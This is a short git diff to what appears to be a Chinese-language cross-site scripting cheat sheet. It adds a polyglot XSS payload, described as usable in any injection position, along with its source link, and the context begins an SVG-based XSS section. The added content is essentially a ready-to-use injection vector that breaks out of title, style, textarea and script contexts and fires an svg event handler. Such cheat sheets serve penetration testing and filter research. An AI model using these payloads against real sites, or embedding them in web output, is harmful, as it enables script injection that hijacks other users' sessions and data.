@@ -17,6 +17,13 @@
 ```
 来源：https://xz.aliyun.com/t/8501
 
+各个位置都可以用的payload：
+```javascript
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+holive(1)//'>
+```
+
+来源：https://eviloh.github.io/2018/08/01/xss%E8%BF%87%E6%BB%A4%E9%80%9F%E6%9F%A5%E8%A1%A8/
+
 ## svg下的xss
 ```
 <svg id="m7" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
